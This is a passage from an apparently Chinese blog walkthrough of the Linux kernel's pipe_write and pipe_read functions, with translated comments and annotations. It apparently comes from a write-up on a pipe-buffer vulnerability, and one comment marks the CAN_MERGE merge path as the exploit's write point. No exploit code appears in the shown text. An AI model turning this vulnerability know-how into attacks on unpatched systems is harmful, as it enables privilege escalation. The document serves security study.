class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line"><span class="type">ssize_t</span> chars;</span><br><span class="line"><span class="type">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line"><span class="type">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Null write succeeds. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;<span class="comment">// 管道没有读者，返回</span></span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue) &#123;</span><br><span class="line">ret = -EXDEV;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 若管道非空，我们尝试将新数据合并到最后一个buffer 中</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 这自然会合并小的写操作，但其也会对</span></span><br><span class="line"><span class="comment"> * 跨越多个页框的大的写操作的剩余写入操作</span></span><br><span class="line"><span class="comment"> * 进行页面对齐</span></span><br><span class="line"><span class="comment"> * （译注：大概就是先尝试把数据写到管道的最后一个buffer（如果对应 page 没写满的话））</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">head = pipe-&gt;head;<span class="comment">// 获取队列头</span></span><br><span class="line">was_empty = pipe_empty(head, pipe-&gt;tail); <span class="comment">// head == tail</span></span><br><span class="line">chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<span class="comment">// 管道非空，且上一个 buf 没写满</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask]; <span class="comment">// 找到上一个 buf</span></span><br><span class="line"><span class="type">int</span> offset = buf-&gt;offset + buf-&gt;len;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 设置了PIPE_BUF_FLAG_CAN_MERGE标志位，</span></span><br><span class="line"><span class="comment">         * 说明该 buffer 可用于直接写入，</span></span><br><span class="line"><span class="comment">         * 直接把数据拷贝进去后就返回</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">// 注：这是漏洞利用的写入点</span></span><br><span class="line"><span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">    offset + chars &lt;= PAGE_SIZE) &#123;</span><br><span class="line">ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret &lt; chars)) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf-&gt;len += ret;</span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写满 last buffer 对应数据后，接下来将剩余数据写到往后的 buffer 中</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;readers) &#123;<span class="comment">// 没有读者，返回</span></span><br><span class="line">send_sig(SIGPIPE, current, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EPIPE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123; <span class="comment">// 管道没满，正常写入</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line"><span class="type">int</span> copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page) &#123;<span class="comment">// 没有预先准备page，分配一个新的</span></span><br><span class="line">page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">ret = ret ? : -ENOMEM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">pipe-&gt;tmp_page = page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 提前在环中分配一个 slot，并附加一个空 buffer。</span></span><br><span class="line"><span class="comment"> * 若我们出错或未能使用它，</span></span><br><span class="line"><span class="comment"> * 它会被读者所使用，</span></span><br><span class="line"><span class="comment"> * 亦或是保留在这里等待下一次写入。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line"><span class="keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<span class="comment">// 管道满了，开启下一次循环</span></span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 将其插入 buffer array 中 */</span></span><br><span class="line">buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (is_packetized(filp))<span class="comment">// 设置 buffer 的 flag，若设置了 O_DIRECT 则为 PACKET</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from);<span class="comment">// 将数据拷贝到 buffer 对应 page 上</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ret += copied;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!iov_iter_count(from))<span class="comment">// 读完数据了，退出循环</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))<span class="comment">// 管道没满，继续下一次循环</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 等待缓冲区空间可用. */</span></span><br><span class="line">        <span class="comment">// 管道满了，等他变空</span></span><br><span class="line"><span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -ERESTARTSYS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 我们将释放管道的锁，等待（有）更多的空间。</span></span><br><span class="line"><span class="comment"> * 若有必要我们将唤醒任意读者，在等待后我们需要重新检查</span></span><br><span class="line"><span class="comment"> * 在我们释放锁后管道是否变空了</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">if</span> (was_empty)</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">wait_event_interruptible_exclusive(pipe-&gt;wr_wait, pipe_writable(pipe));</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">was_empty = pipe_empty(pipe-&gt;head, pipe-&gt;tail);</span><br><span class="line">wake_next_writer = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line">wake_next_writer = <span class="literal">false</span>;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 若我们进行了一次唤醒事件，我们做一个“同步”唤醒，</span></span><br><span class="line"><span class="comment"> * 因为相比起让数据仍旧等待，我们想要让读者去尽快</span></span><br><span class="line"><span class="comment"> * 处理事情</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 尤其是，这对小的写操作重要，这是因为（例如）GNU 让</span></span><br><span class="line"><span class="comment"> * jobserver 使用小的写操作来唤醒等待的工作</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Epoll 则没有意义地想要一个唤醒，</span></span><br><span class="line"><span class="comment"> * 无论管道是否已经空了</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (was_empty || pipe-&gt;poll_usage)</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line"><span class="keyword">if</span> (wake_next_writer)</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span> &amp;&amp; sb_start_write_trylock(file_inode(filp)-&gt;i_sb)) &#123;</span><br><span class="line"><span class="type">int</span> err = file_update_time(filp);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line">ret = err;</span><br><span class="line">sb_end_write(file_inode(filp)-&gt;i_sb);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="管道的读出过程"><a href="#管道的读出过程" class="headerlink" title="管道的读出过程"></a>管道的读出过程</h3><p>从管道中读出数据则是通过 <code>pipe_read</code>，主要是读取 buffer 对应 page 上的数据，若一个 buffer 被读完了则将其出列</p><p>原理还是比较简单的，这里就不深入分析了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_read</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *to)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> total_len = iov_iter_count(to);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="type">bool</span> was_full, wake_next_reader = <span class="literal">false</span>;</span><br><span class="line"><span class="type">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Null read succeeds. */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(total_len == <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 若管道满了，我们只在开始读取时唤醒写者</span></span><br><span class="line"><span class="comment"> * 以避免没有必要的唤醒</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 但当我们唤醒写者时，我们使用一个同步唤醒(WF_SYNC)</span></span><br><span class="line"><span class="comment"> * 因为我们想要他们行动起来并为我们生成更多数据</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">was_full = pipe_full(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage);</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head = pipe-&gt;head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail = pipe-&gt;tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;note_loss) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification</span> <span class="title">n</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (total_len &lt; <span class="number">8</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = -ENOBUFS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">n.type = WATCH_TYPE_META;</span><br><span class="line">n.subtype = WATCH_META_LOSS_NOTIFICATION;</span><br><span class="line">n.info = watch_sizeof(n);</span><br><span class="line"><span class="keyword">if</span> (copy_to_iter(&amp;n, <span class="keyword">sizeof</span>(n), to) != <span class="keyword">sizeof</span>(n)) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ret += <span class="keyword">sizeof</span>(n);</span><br><span class="line">total_len -= <span class="keyword">sizeof</span>(n);</span><br><span class="line">pipe-&gt;note_loss = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe_empty(head, tail)) &#123;<span class="comment">// 管道非空，逐 buffer 读出数据</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];</span><br><span class="line"><span class="type">size_t</span> chars = buf-&gt;len;</span><br><span class="line"><span class="type">size_t</span> written;</span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chars &gt; total_len) &#123;</span><br><span class="line"><span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_WHOLE) &#123;</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = -ENOBUFS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">chars = total_len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">error = pipe_buf_confirm(pipe, buf);</span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = error;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将 buffer 对应 page 数据拷贝出来</span></span><br><span class="line">written = copy_page_to_iter(buf-&gt;page, buf-&gt;offset, chars, to);</span><br><span class="line"><span class="keyword">if</span> (unlikely(written &lt; chars)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ret += chars;</span><br><span class="line">buf-&gt;offset += chars;</span><br><span class="line">buf-&gt;len -= chars;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这是一个 packet buffer？清理并退出 */</span></span><br><span class="line"><span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_PACKET) &#123;</span><br><span class="line">total_len = chars;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!buf-&gt;len) &#123;<span class="comment">// buffer 空了，释放</span></span><br><span class="line">pipe_buf_release(pipe, buf);</span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (buf-&gt;flags &amp; PIPE_BUF_FLAG_LOSS)</span><br><span class="line">pipe-&gt;note_loss = <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">tail++;<span class="comment">// 被读的 buffer 出队</span></span><br><span class="line">pipe-&gt;tail = tail;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">&#125;</span><br><span class="line">total_len -= chars;</span><br><span class="line"><span class="keyword">if</span> (!total_len)</span><br><span class="line"><span class="keyword">break</span>;<span class="comment">/* 常规路径：读取成功 */</span></span><br><span class="line"><span class="keyword">if</span> (!pipe_empty(head, tail))<span class="comment">/* More to do? */</span></span><br><span class="line"><span class="keyword">continue</span>;<span class="comment">// 没读完，还有数据，接着读</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pipe-&gt;writers)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 我们只有在确实没读到东西时到达这里</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 然而，我们或许已看到（并移除） 一个 size 为 0 的 buffer，</span></span><br><span class="line"><span class="comment"> * 这可能会在 buffers 中创造空间</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 你无法通过一个空写入来制造 size 为 0 的 pipe buffers（packet mode 也不行）</span></span><br><span class="line"><span class="comment"> * 但若写者在尝试填充一个已经分配并插入到 buffer 数组中</span></span><br><span class="line"><span class="comment"> * 的 buffer 时获得了一个 EFAULT，则这是有可能发生的</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 故我们仍需在【非常】不太可能发生的情况：</span></span><br><span class="line"><span class="comment"> * “管道满了，但我们没有获得数据”下</span></span><br><span class="line"><span class="comment"> * 唤醒任何等待的写者</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(was_full))</span><br><span class="line">wake_up_interruptible_sync_poll(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line">kill_fasync(&amp;pipe-&gt;fasync_writers, SIGIO, POLL_OUT);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 